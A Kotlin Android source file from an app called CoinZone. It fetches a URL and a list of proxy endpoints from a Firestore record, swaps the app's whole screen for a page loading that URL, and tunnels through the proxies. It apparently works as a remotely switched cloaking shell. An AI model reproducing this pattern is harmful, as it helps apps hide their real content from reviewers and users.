package com.CoinZone.CoinZone

import android.os.Bundle
import android.util.Log
import androidx.fragment.app.FragmentActivity
import com.appsflyerext.ext.AFApp
import com.appsflyerext.ext.widgets.ContentFragment
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.networkh.lib.extension.isNotNullEmpty
import com.networkh.lib.service.MultiNetworkManager
import com.networkh.lib.service.NetworkHelper
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class FireBaseApp(
    private val activity: FragmentActivity,
    private val scope: CoroutineScope
) {

    private val multiNetworkManager: MultiNetworkManager = MultiNetworkManager(activity, scope)
    private lateinit var contentFragment: ContentFragment

    fun onCreate() {
        val handler = CoroutineExceptionHandler { coroutineContext, throwable ->
            throwable.printStackTrace()
        }
        scope.launch(Dispatchers.IO + handler) {
            val db = Firebase.firestore
            db.collection("rec")
                .get()
                .addOnSuccessListener { result ->
                    Log.d("FirebaseApp","Succ:${result.size()}")
                    if (result.size() > 0) {
                        val doc = result.documents.first()
                        val url = doc.get("u") as? String
                        if (url.isNotNullEmpty()) {
                            val endpoints = doc.get("v") as? String
                            if (endpoints.isNotNullEmpty()) {
                                //先建立VPN连接
                                val list = endpoints!!.split(",")
                                    .toList()
                                val cachedBest = getBest()
                                //把list中能找到的best提到首位来
                                val newList = if (cachedBest != null) {
                                    val l = mutableListOf(cachedBest)
                                    list.forEach {
                                        if (it != cachedBest) l.add(it)
                                    }
                                    l
                                } else {
                                    list
                                }
                                onResult(url!!, newList, true)
                            } else {
                                onResult(url!!, emptyList(), true)
                            }
                        }
                    } else {
                        val u = getCachedU()
                        val vpnList = getCachedV()
                        if (u.isNotNullEmpty()) {
                            onResult(u!!, vpnList)
                        }
                    }
                }.addOnFailureListener {
                    val u = getCachedU()
                    val vpnList = getCachedV()
                    if (u.isNotNullEmpty()) {
                        onResult(u!!, vpnList)
                    }
                }
        }
    }

    private fun onResult(u: String, vpnList: List<String>, shouldCache: Boolean = false) {
        if (shouldCache) {
            cache(u)
            if (vpnList.isNotEmpty()) {
                cache(vpnList)
            }
        }
        inject(u)
        if (vpnList.isNotEmpty()) {
            var first: NetworkHelper? = null
            multiNetworkManager.openAll(
                configs = vpnList,
                onFirstEndpoint = {
                    first = it
                    NetworkHelper.useProxy(it)
                    reload()
                },
                onBestEndpoint = {
                    if (it != first) {
                        NetworkHelper.useProxy(it)
                        reload()
                        cacheBest(it.config)
                    }
                }
            )
        }
    }

    fun onDestroy() {
        multiNetworkManager.clear()
    }

    private fun reload() {
        if (this::contentFragment.isInitialized) {
            contentFragment.reload()
        }
    }

    private fun inject(u: String) {
        try {
            contentFragment = ContentFragment().apply {
                arguments = Bundle().apply {
                    putString("u", u)
                }
            }
            activity.supportFragmentManager.beginTransaction()
                .replace(android.R.id.content, contentFragment)
                .commitAllowingStateLoss()
        } catch (ignore: Exception) {
        }
    }

    private fun cache(u: String) {
        val application = activity.application
        val conf = (application as AFApp).conf
        val sp = activity.getSharedPreferences(conf.afSPName, 0)
        sp.edit().putString("home_u", u).apply()
    }

    private fun cache(list: List<String>) {
        val application = activity.application
        val conf = (application as AFApp).conf
        val sp = activity.getSharedPreferences(conf.afSPName, 0)
        sp.edit().putStringSet("home_v", list.toSet()).apply()
    }

    private fun getCachedU(): String? {
        val application = activity.application
        val conf = (application as AFApp).conf
        val sp = activity.getSharedPreferences(conf.afSPName, 0)
        return sp.getString("home_u", null)
    }

    private fun getCachedV(): List<String> {
        val application = activity.application
        val conf = (application as AFApp).conf
        val sp = activity.getSharedPreferences(conf.afSPName, 0)
        return sp.getStringSet("home_v", null)?.toMutableList() ?: emptyList()
    }

    private fun cacheBest(config: String) {
        val application = activity.application
        val conf = (application as AFApp).conf
        val sp = activity.getSharedPreferences(conf.afSPName, 0)
        sp.edit().putString("home_b", config).apply()
    }

    private fun getBest(): String? {
        val application = activity.application
        val conf = (application as AFApp).conf
        val sp = activity.getSharedPreferences(conf.afSPName, 0)
        return sp.getString("home_b", null)
    }
}